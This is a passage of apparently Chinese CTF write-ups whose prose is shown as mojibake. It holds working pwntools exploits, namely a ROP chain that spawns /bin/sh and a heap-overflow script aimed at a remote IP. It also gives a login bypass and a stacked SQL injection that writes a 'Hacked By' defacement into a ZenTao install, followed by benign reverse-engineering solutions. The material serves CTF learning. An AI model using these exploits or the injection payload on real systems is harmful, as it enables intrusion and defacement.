åœ¨æ ˆä¸Šå†™å…¥ropchinæ‰§è¡Œsystem("/bin/sh")

å›çœ‹è¿™é“é¢˜ç›®ï¼Œä¸»è¦æ˜¯é€»è¾‘éš¾ä»¥ç†è§£ï¼Œidaåæ±‡ç¼–çš„ç¨‹åºç»“æ„æ¯”è¾ƒå¥‡æ€ªï¼Œè®©äººå¾ˆéš¾å¿«é€Ÿæ‰¾åˆ°æ¼æ´ç‚¹



EXPä»…ä¾›å‚è€ƒï¼š

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
p = process("./eval")
elf = ELF("./eval")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------
# dbg(0xe0f)
# dbg(0xAF2)
p.sendline('+52')

libc_addr = int(p.recvline()) - 0x24083
success('libc_addr: ' + hex(libc_addr))

# dbg(0xF4E)
p.sendline(f'+54-{libc_addr + 0x52290}'.encode())
p.recvline()
p.sendline(f'+53-{libc_addr + 0x0000000000054310}'.encode())
p.recvline()
p.sendline(f'+52-{libc_addr + 0x1b45bd}'.encode())
p.recvline()
p.sendline(f'+51-{libc_addr + 0x0000000000023b6a}'.encode())
p.recvline()

p.sendline()

ia()
```



### heap

è¿™é¢˜æ˜¯2023æŸé¹­æ¯çš„å¦ä¸€é“pwné¢˜ï¼Œå¸¸è§„èœå•ï¼Œå¾ˆå®¹æ˜“èƒ½å‘ç°æ¼æ´ç‚¹åœ¨äºsub_DCCå‡½æ•°ä¸­å­˜åœ¨å †æº¢å‡º

```c
__int64 sub_DCC()
{
  __int64 result; // rax
  int v1; // [rsp+Ch] [rbp-4h]

  printf("index: ");
  result = read_num();
  v1 = result;
  if ( result <= 0x1F )
  {
    result = ptr[result];
    if ( result )
    {
      printf("data: ");
      return read(0, ptr[v1], 0x1000uLL);
    }
  }
  return result;
}
```

é¢˜ç›®çš„é—®é¢˜åœ¨äºæ²¡æœ‰ä½¿ç”¨glibcçš„å †ç®¡ç†ï¼Œè€Œæ˜¯è‡ªå·±å†™äº†ä¸€ä¸ªmallocå‡½æ•°å’Œfreeå‡½æ•°ï¼Œå…¶é€†å‘ç¨‹åº¦åŒæ ·å¾ˆé«˜ï¼Œä½†å’Œevalä¸ä¸€æ ·çš„æ˜¯ï¼Œè¿™é¢˜æˆ‘ä»¬æ˜¯çŸ¥é“å¦‚ä½•è§¦å‘æ¼æ´ç‚¹çš„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯¹å †çš„ç»“æ„ä¸äº†è§£ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡çº¯åŠ¨è°ƒçš„æ–¹å¼æ¥ç†è§£å †ç»“æ„

```python
add(0x20)
add(0x20)
add(0x20)
add(0x20)
add(0x20)
dbg()
#delete(2)
#delete(1)
#delete(0)
#add(0x20)
#dbg()
```

åŠ¨è°ƒæµ‹è¯•

```shell
pwndbg> dq $rebase(0x2030E0)
000055acfac030e0     00007f3dcae09028 00007f3dcae09080
000055acfac030f0     00007f3dcae090d8 00007f3dcae09130
000055acfac03100     00007f3dcae09188 0000000000000000
000055acfac03110     0000000000000000 0000000000000000
pwndbg> dq 00007f3dcae09028 60
00007f3dcae09028     0000000000000000 0000000000000000
00007f3dcae09038     0000000000000000 0000000000000000
00007f3dcae09048     0000000000000000 0000000000000000
00007f3dcae09058     441a12390ea44d00 00000031aaaaaaaa
00007f3dcae09068     00007f3dcae090b0 0000000000000000
00007f3dcae09078     0000000000000000 0000000000000000
00007f3dcae09088     0000000000000000 0000000000000000
00007f3dcae09098     0000000000000000 0000000000000000
00007f3dcae090a8     0000000000000000 15e9be126d128400
00007f3dcae090b8     00000031aaaaaaaa 00007f3dcae09108
00007f3dcae090c8     0000000000000000 0000000000000000
00007f3dcae090d8     0000000000000000 0000000000000000
00007f3dcae090e8     0000000000000000 0000000000000000
00007f3dcae090f8     0000000000000000 0000000000000000
00007f3dcae09108     6f3bc3355c16f900 00000031aaaaaaaa
00007f3dcae09118     00007f3dcae09160 0000000000000000
00007f3dcae09128     0000000000000000 0000000000000000
00007f3dcae09138     0000000000000000 0000000000000000
00007f3dcae09148     0000000000000000 0000000000000000
00007f3dcae09158     0000000000000000 1f9d040849124f00
00007f3dcae09168     00000031aaaaaaaa 0000000000000000
00007f3dcae09178     0000000000000000 0000000000000000
00007f3dcae09188     0000000000000000 0000000000000000
00007f3dcae09198     0000000000000000 0000000000000000
```

æˆ‘ä»¬å‘ç°ç”³è¯·çš„å †é€šè¿‡é“¾è¡¨åœ¨ç®¡ç†ã€‚

é™¤äº†ä¸€ä¸ªkeyã€æ ‡å¿—sizeä½ã€aaaaaaaaå¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªchunkçš„headå¤´çš„æŒ‡é’ˆ

æ¥ä¸‹æ¥è§‚å¯Ÿfreeåçš„å˜åŒ–(åœ°å€åä¸‰ä½æ˜¯ä¸å˜çš„)

```c
add(0x20)
add(0x20)
add(0x20)
add(0x20)
add(0x20)
delete(2)
delete(1)
delete(0)
dbg()
```



```shell
pwndbg> dq 0x0007fe70c574028-0x60 100
00007fe70c573fc8     0000000000000000 0000000000000000
00007fe70c573fd8     0000000000000000 0000000000000000
00007fe70c573fe8     0000000000000000 0000000000000000
00007fe70c573ff8     0000000000000000 5b6f69427e251400
00007fe70c574008     00000030aaaaaaaa 00007fe70c574058
00007fe70c574018     00007fe70c574058 0000000000000000
00007fe70c574028     0000000000000000 0000000000000000
00007fe70c574038     0000000000000000 0000000000000000
00007fe70c574048     0000000000000000 0000000000000000
00007fe70c574058     0a50bd2c157fe100 00000030aaaaaaaa
00007fe70c574068     00007fe70c5740b0 00007fe70c5740b0
00007fe70c574078     0000000000000000 0000000000000000
00007fe70c574088     0000000000000000 0000000000000000
00007fe70c574098     0000000000000000 0000000000000000
00007fe70c5740a8     0000000000000000 3677f0c513b18f00
00007fe70c5740b8     00000030aaaaaaaa 00007fe70c574108
00007fe70c5740c8     0000000000000000 0000000000000000
00007fe70c5740d8     0000000000000000 0000000000000000
00007fe70c5740e8     0000000000000000 0000000000000000
00007fe70c5740f8     0000000000000000 0000000000000000
00007fe70c574108     5569304f1084bd00 00000031aaaaaaaa
00007fe70c574118     00007fe70c574160 0000000000000000
00007fe70c574128     0000000000000000 0000000000000000
00007fe70c574138     0000000000000000 0000000000000000
00007fe70c574148     0000000000000000 0000000000000000
00007fe70c574158     0000000000000000 072959291e153800
00007fe70c574168     00000031aaaaaaaa 0000000000000000
00007fe70c574178     0000000000000000 0000000000000000
00007fe70c574188     0000000000000000 0000000000000000
00007fe70c574198     0000000000000000 0000000000000000
00007fe70c5741a8     0000000000000000 0000000000000000
00007fe70c5741b8     0000000000000000 0000000000000000
00007fe70c5741c8     0000000000000000 0000000000000000
00007fe70c5741d8     0000000000000000 0000000000000000
```

æˆ‘ä»¬å‘ç°æ¯ä¸ªchunkæ–°å¢äº†ä¸€ä¸ªæŒ‡é’ˆï¼Œæˆ‘ä»¬é¢„æœŸçš„æƒ…å†µæ˜¯

```
0->1->2
```

æ–°å¢çš„æŒ‡é’ˆç¬¦åˆæˆ‘ä»¬çš„é¢„æœŸï¼Œé‚£æˆ‘ä»¬åˆ¤æ–­è¯¥æŒ‡é’ˆå¯èƒ½ä¸ºfree_chunkçš„fdæŒ‡é’ˆ

åç»­çš„æ€è·¯å°±æ˜¯åŠ«æŒfree_hookä¸ºåé—¨å‡½æ•°æ‰“å‡ºç¯å¢ƒå˜é‡é‡Œçš„flagï¼Œè¿™é‡Œçš„free_hookæ˜¯ä¸ªbssæ®µå˜é‡ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ç¨‹åºçš„åŸºåœ°å€ã€‚

ç”±äºæœ‰äº†ä»»æ„åœ°å€å†™ï¼Œè€ƒè™‘åŠ«æŒstdoutå®ç°æ³„éœ²å‡ºç¨‹åºåŸºåœ°å€ï¼Œç¨‹åºè°ƒç”¨libcä¼šäº§ç”Ÿåœ°å€ä¸Šçš„äº¤äº’ã€‚

```shell
pwndbg> search libc.so.6
Searching for value: 'libc.so.6'
heap            0x563314e04201 'libc.so.6'
libc-2.31.so    0x7fe70c68be01 'libc.so.6'
[anon_7fe70c862] 0x7fe70c8664a0 'libc.so.6'
[anon_7fe70c862] 0x7fe70c8664eb 'libc.so.6'
[anon_7fe70c897] 0x7fe70c897f6b 'libc.so.6'
pwndbg> search -p 0x563314e04201
Searching for value: b'\x01B\xe0\x143V\x00\x00'
[anon_7fe70c862] 0x7fe70c8665b0 0x563314e04201
[anon_7fe70c862] 0x7fe70c8665c8 0x563314e04201
[stack]         0x7fff79ee0ab8 0x563314e04201
[stack]         0x7fff79ee1050 0x563314e04201
```

å†åŒæ ·çš„æ–¹å¼åŠ«æŒfree_hookå³å¯

ç”±äºä¸çŸ¥é“è¿œç¨‹çš„libcç‰ˆæœ¬ï¼Œä¹Ÿæ²¡ç»™libcï¼Œä½†æ˜¯åº”è¯¥å¯ä»¥é€šè¿‡stdoutå»æ³„éœ²å‡ ä¸ªlibcå‡½æ•°æ¥åˆ¤æ–­ç‰ˆæœ¬



EXPä»…ä¾›å‚è€ƒï¼Œä¸å”¯ä¸€

```python
#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from pwn import *
context.clear(arch='amd64', os='linux', log_level='debug')

sh = remote('8.130.120.45', 20199)

def add(size):
    sh.sendlineafter(b'> ', b'1')
    sh.sendlineafter(b'size: ', str(size).encode())

def delete(index):
    sh.sendlineafter(b'> ', b'2')
    sh.sendlineafter(b'index: ', str(index).encode())

def edit(index, data):
    sh.sendlineafter(b'> ', b'3')
    sh.sendlineafter(b'index: ', str(index).encode())
    sh.sendafter(b'data: ', data)

def show(index):
    sh.sendlineafter(b'> ', b'4')
    sh.sendlineafter(b'index: ', str(index).encode())

add(0x20)
add(0x20)
add(0x20)
add(0x20)
delete(1)
edit(0, b'a' * 0x31)
show(0)
sh.recvuntil(b'a' * 0x31)
guard = u64(b'\0' + sh.recvn(7))
success('guard: ' + hex(guard))
edit(0, b'a' * 0x40)
show(0)
sh.recvuntil(b'a' * 0x40)
heap_addr = u64(sh.recvn(6) + b'\0\0')
success('heap_addr: ' + hex(heap_addr))
libc_addr = heap_addr + 0xfff50
success('libc_addr: ' + hex(libc_addr))
edit(0, b'a' * 0x30 + p64(guard) + b'a' * 0x10 + p64(heap_addr+0x2ed5f0-0x28))
add(0x20)
add(0x20)
edit(4, flat([0xfbad3887, 0, 0, 0, libc_addr + 0x1f2570, libc_addr + 0x1f2578, libc_addr + 0x1f2578, libc_addr + 0x1f2578]))
image_addr =  u64(sh.recvn(8)) - 0x609
success('image_addr: ' + hex(image_addr))

delete(1)
edit(0, b'a' * 0x31)
show(0)
sh.recvuntil(b'a' * 0x31)
guard = u64(b'\0' + sh.recvn(7))
success('guard: ' + hex(guard))
edit(0, b'a' * 0x30 + p64(guard) + b'a' * 0x10 + p64(image_addr+0x2031E8-0x28))
add(0x20)
add(0x20)
edit(5, p64(image_addr + 0xEAD))
delete(1)

sh.interactive()
```


### 2023 qwb zento

å¯åŠ¨å‘½ä»¤é¢˜ç›®ç»™äº†ä¸€ä¸ªdeploy.txt
```
docker run -dit  --name=zentao -p 30021:80  ctf2:latest
docker exec -it zentao /opt/zbox/zbox restart
```

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240116150253.png)

ç‚¹å‡»å¼€æºç‰ˆ

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240116150417.png)


å…ˆå‘åŒ…ç»•è¿‡ç™»å½•
```HTTP
POST /zentao/user-login.html HTTP/1.1
Host: 0.0.0.0:30021
Content-Length: 138
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://0.0.0.0:30021
Referer: http://0.0.0.0:30021/zentao/user-login-L3plbnRhby8=.html
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: zentaosid=a2d4f9dd1efebf91a94b2be556cf5fda; lang=zh-cn; device=desktop; theme=default; windowWidth=1197; windowHeight=791
Connection: close

account=admin&password=94cda481b441635884574c8f7022538ee0f02e75&passwordStrength=0&referer=%2Fzentao%2Fproject-execution-all-1-order_asc-0.html&verifyRand=1282546002&keepLogin=0&captcha=
```

æ‹¿åˆ°cookieåï¼Œè¿›è¡Œå‘åŒ…sqlæ³¨å…¥


```HTTP
POST /zentao/project-create-waterfall-0-0-productID=0,branchID=0.html HTTP/1.1
Host: 0.0.0.0:30021
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
Content-Length: 1000
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: zentaosid=a2d4f9dd1efebf91a94b2be556cf5fda; lang=zh-cn; device=desktop; theme=default; windowWidth=1197; windowHeight=791 
Dnt: 1
Origin: http://0.0.0.0:30021
Referer: http://0.0.0.0:30021/zentao/project-create-waterfall-0-0-productID=0,branchID=0.html
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

PM=admin&acl=private&auth=extend&begin=2024-01-13&budget=1111&budgetUnit=CNY&days=21&delta=31&desc=1111&division=0&end=2024-02-12&hasProduct=1&model=waterfall&name=111&parent=2;SeT @a=0x53454c45435420434f4e43415428554e48455828273363363837343664366333653363366436353734363132303633363836313732373336353734336432323535353434363264333832323365336336383635363136343365336332663638363536313634336533633730323036313663363936373665336432323633363536653734363537323232323037333734373936633635336432323636366636653734326437333639376136353361333533353730373833623230363336663663366637323361373236353634323232303365343836313633366236353634323034323739323037623764336332663730323033653363326636323666363437393365336332663638373436643663336527292c202720272920494e544f204f555446494c4520272f6f70742f7a626f782f6170702f7a656e74616f2f7777772f696e6465782e68746d6c273b;prepare execsql from @a;execute execsql;&productName=&products%5B0%5D=1&uid=65a27fd6db7c3

```

```
0x53454c45435420434f4e43415428554e48455828273363363837343664366333653363366436353734363132303633363836313732373336353734336432323535353434363264333832323365336336383635363136343365336332663638363536313634336533633730323036313663363936373665336432323633363536653734363537323232323037333734373936633635336432323636366636653734326437333639376136353361333533353730373833623230363336663663366637323361373236353634323232303365343836313633366236353634323034323739323037623764336332663730323033653363326636323666363437393365336332663638373436643663336527292c202720272920494e544f204f555446494c4520272f6f70742f7a626f782f6170702f7a656e74616f2f7777772f696e6465782e68746d6c273b

to

SELECT CONCAT(UNHEX('3c68746d6c3e3c6d65746120636861727365743d225554462d38223e3c686561643e3c2f686561643e3c7020616c69676e3d2263656e74657222207374796c653d22666f6e742d73697a653a353570783b20636f6c6f723a72656422203e4861636b6564204279207b7d3c2f70203e3c2f626f64793e3c2f68746d6c3e'), ' ') INTO OUTFILE '/opt/zbox/app/zentao/www/index.html';

3c68746d6c3e3c6d65746120636861727365743d225554462d38223e3c686561643e3c2f686561643e3c7020616c69676e3d2263656e74657222207374796c653d22666f6e742d73697a653a353570783b20636f6c6f723a72656422203e4861636b6564204279207b7d3c2f70203e3c2f626f64793e3c2f68746d6c3e

to

<html><meta charset="UTF-8"><head></head><p align="center" style="font-size:55px; color:red" >Hacked By {}</p ></body></html>

```


### treasure_hunter

SwissTable



hashmap

è®°å½• åŒºåŸŸç¼–å·ï¼šæ˜¯å¦å®‰å…¨


## RE challenge ğŸ¹
### [BJDCTF2020]JustRE

```c
sprintf(String, " BJD{%d%d2069a45792d233ac}", 19999, 0);
```

### åˆ®å¼€æœ‰å¥–

å…ˆè§£sub_4010F0

```
.text:0040123D                 mov     [ebp+var_20030], 5Ah ; 'Z'
.text:00401247                 mov     [ebp+var_2002C], 4Ah ; 'J'
.text:00401251                 mov     [ebp+var_20028], 53h ; 'S'
.text:0040125B                 mov     [ebp+var_20024], 45h ; 'E'
.text:00401265                 mov     [ebp+var_20020], 43h ; 'C'
.text:0040126F                 mov     [ebp+var_2001C], 61h ; 'a'
.text:00401279                 mov     [ebp+var_20018], 4Eh ; 'N'
.text:00401283                 mov     [ebp+var_20014], 48h ; 'H'
.text:0040128D                 mov     [ebp+var_20010], 33h ; '3'
.text:00401297                 mov     [ebp+var_2000C], 6Eh ; 'n'
.text:004012A1                 mov     [ebp+var_20008], 67h ; 'g'
.text:004012AB                 call    sub_4010F0
```

```c
#include <stdio.h>

int sub_5510F0(char a1[], int a2, int a3) {
    int result = a3;
    int i, v5, v6;

    for (i = a2; i <= a3; a2 = i) {
        v5 = i;
        v6 = a1[i];

        if (a2 < result && i < result) {
            do {
                if (v6 > a1[result]) {
                    if (i >= result) break;
                    ++i;
                    a1[v5] = a1[result];

                    if (i >= result) break;
                    while (a1[i] <= v6) {
                        if (++i >= result) goto LABEL_13;
                    }

                    if (i >= result) break;
                    v5 = i;
                    a1[result] = a1[i];
                }
                --result;
            } while (i < result);
        }

LABEL_13:
        a1[result] = v6;
        sub_5510F0(a1, a2, i - 1);  // é€’å½’è°ƒç”¨
        result = a3;
        ++i;
    }

    return result;
}

int main(void) {
    char str[] = "ZJSECaNH3ng";  // è¾“å…¥å­—ç¬¦ä¸²
    sub_5510F0(str, 0, 10);       // è°ƒç”¨æ’åºå‡½æ•°
    printf("%s\n", str);          // æ‰“å°æ’åºåçš„å­—ç¬¦ä¸²

    return 0;
}

```

```shell
âœ  buure ./test
3CEHJNSZagn
```

æœ€ç»ˆstringè¦å˜æˆè¿™æ ·ï¼Œå¾—åˆ°UJWPï¼ŒV4å’ŒV5ä¸ç”¨ç®—ï¼Œbase64è§£ç å³å¯

```c
    if ( String[0] == v7[0] + 0x22 //3->0x33 0x55->U
        && String[1] == v10 //J->0X4a 
        && 4 * String[2] - 141 == 3 * v8 // E->0x45*3->0xCF +141 ->0x15C /4->0x57->W
        && String[3] / 4 == 2 * (v13 / 9) //P
        && !strcmp(v4, "ak1w")  //jMp
        && !strcmp(v5, "V1Ax") ) //WP1
      {
        MessageBoxA(hDlg, "U g3t 1T!", "@_@", 0);
      }
```

flag{UJWP1jMp}


### [ACTFæ–°ç”Ÿèµ›2020]easyre

vå°±æ˜¯è¾“å…¥çš„flagå…¶å®æ˜¯data_startæ•°ç»„çš„ä¸‹æ ‡ã€‚ç¡®ä¿è¿™ä¸ªä¸‹æ ‡ç´¢å¼•çš„å€¼ç­‰äºV4[i]å³å¯
æ‰€ä»¥åå‘æ€è€ƒå°±æ˜¯å»æ‰¾V4æ¯ä¸ªå…ƒç´ åœ¨dataä¸­çš„ä¸‹æ ‡æ˜¯å¤šå°‘å†åŠ ä¸Š1ï¼Œå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„V5

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _BYTE v4[12]; // [esp+12h] [ebp-2Eh] BYREF
  _DWORD v5[3]; // [esp+1Eh] [ebp-22h]
  _BYTE v6[5]; // [esp+2Ah] [ebp-16h] BYREF
  int v7; // [esp+2Fh] [ebp-11h]
  int v8; // [esp+33h] [ebp-Dh]
  int v9; // [esp+37h] [ebp-9h]
  char v10; // [esp+3Bh] [ebp-5h]
  int i; // [esp+3Ch] [ebp-4h]

  __main();
  qmemcpy(v4, "*F'\"N,\"(I?+@", sizeof(v4));
  printf("Please input:");
  scanf("%s", v6);
  if ( v6[0] != 'A' || v6[1] != 'C' || v6[2] != 'T' || v6[3] != 'F' || v6[4] != '{' || v10 != '}' )
    return 0;
  v5[0] = v7;
  v5[1] = v8;
  v5[2] = v9;
  for ( i = 0; i <= 11; ++i )
  {
    if ( v4[i] != _data_start__[*(v5 + i) - 1] )//å®ƒæ£€æŸ¥ v4 æ•°ç»„çš„ç¬¬ i ä¸ªå­—èŠ‚ï¼Œæ˜¯å¦å’Œ\_data_start__ æ•°ç»„ä¸­ï¼Œç´¢å¼•ä¸º v5[i] - 1 çš„å­—èŠ‚æ˜¯å¦ç›¸åŒã€‚
      return 0;
  }
  printf("You are correct!");
  return 0;
}
```

```python
v4 = [42,70,39,34,78,44,34,40,73,63,43,64]
s = ''
flag = ''
__data_strart__ = '~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)(\'&%$# !"'
for i in v4:
    s += chr(__data_strart__.find(chr(i))+1)
    print(s)
```


### ç®€å•æ³¨å†Œå™¨

```java
/* loaded from: classes.dex */
public class MainActivity extends ActionBarActivity {
    /* JADX INFO: Access modifiers changed from: protected */
    @Override // android.support.v7.app.ActionBarActivity, android.support.v4.app.FragmentActivity, android.app.Activity
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        if (savedInstanceState == null) {
            getSupportFragmentManager().beginTransaction().add(R.id.container, new PlaceholderFragment()).commit();
        }
        Button button = (Button) findViewById(R.id.button1);
        final TextView textview = (TextView) findViewById(R.id.textView1);
        final EditText editview = (EditText) findViewById(R.id.editText1);
        button.setOnClickListener(new View.OnClickListener() { // from class: com.example.flag.MainActivity.1
            @Override // android.view.View.OnClickListener
            public void onClick(View v) {
                int flag = 1;
                String xx = editview.getText().toString();
                flag = (xx.length() == 32 && xx.charAt(31) == 'a' && xx.charAt(1) == 'b' && (xx.charAt(0) + xx.charAt(2)) + (-48) == 56) ? 0 : 0;
                if (flag == 1) {
                    char[] x = "dd2940c04462b4dd7c450528835cca15".toCharArray();
                    x[2] = (char) ((x[2] + x[3]) - 50);
                    x[4] = (char) ((x[2] + x[5]) - 48);
                    x[30] = (char) ((x[31] + x[9]) - 48);
                    x[14] = (char) ((x[27] + x[28]) - 97);
                    for (int i = 0; i < 16; i++) {
                        char a = x[31 - i];
                        x[31 - i] = x[i];
                        x[i] = a;
                    }
                    String bbb = String.valueOf(x);
                    textview.setText("flag{" + bbb + "}");
                    return;
                }
                textview.setText("è¾“å…¥æ³¨å†Œç é”™è¯¯");
            }
        });
    }

```

ç¼–å†™é€†å‘è„šæœ¬


```c
#include <stdio.h>

int main()
{
    char x[] = "dd2940c04462b4dd7c450528835cca15";
    x[2] = (char)((x[2] + x[3]) - 50);
    x[4] = (char)((x[2] + x[5]) - 48);
    x[30] = (char)((x[31] + x[9]) - 48);
    x[14] = (char)((x[27] + x[28]) - 97);
    for (int i = 0; i < 16; i++) {
        char a = x[31 - i];
        x[31 - i] = x[i];
        x[i] = a;
    }
    puts(x);
    return 0;
}
```

### [GWCTF 2019]pyre

https://tool.lu/pyc/ pycé€†å‘

```python
#!/usr/bin/env python
# visit https://tool.lu/pyc/ for more information
# Version: Python 2.7

print 'Welcome to Re World!'
print 'Your input1 is your flag~'
l = len(input1)
for i in range(l):
    num = ((input1[i] + i) % 128 + 128) % 128
    code += num

for i in range(l - 1):
    code[i] = code[i] ^ code[i + 1] # é¡ºåºå¼‚æˆ–

print code
code = [
    '%1f',
    '%12',
    '%1d',
    '(',
    '0',
    '4',
    '%01',
    '%06',
    '%14',
    '4',
    ',',
    '%1b',
    'U',
    '?',
    'o',
    '6',
    '*',
    ':',
    '%01',
    'D',
    ';',
    '%',
    '%13']

```


```python
code = ['\x1f', '\x12', '\x1d', '(', '0', '4', '\x01', '\x06', '\x14', '4', ',', '\x1b', 'U', '?', 'o', '6', '*', ':', '\x01', 'D', ';', '%', '\x13']

flag = ''

# æŒ‰é€†é¡ºåºè¿›è¡Œå¼‚æˆ–æ“ä½œ
for i in range(len(code)-2, -1, -1): # å€’æ•°ç¬¬äºŒä¸ªå¼€å§‹
    code[i] = chr(ord(code[i]) ^ ord(code[i+1]))

# æ ¹æ®å…¬å¼æ¢å¤åŸå§‹çš„ input1ï¼ˆflagï¼‰
for i in range(len(code)):
    flag += chr((ord(code[i])-i)%128)

print(flag)
```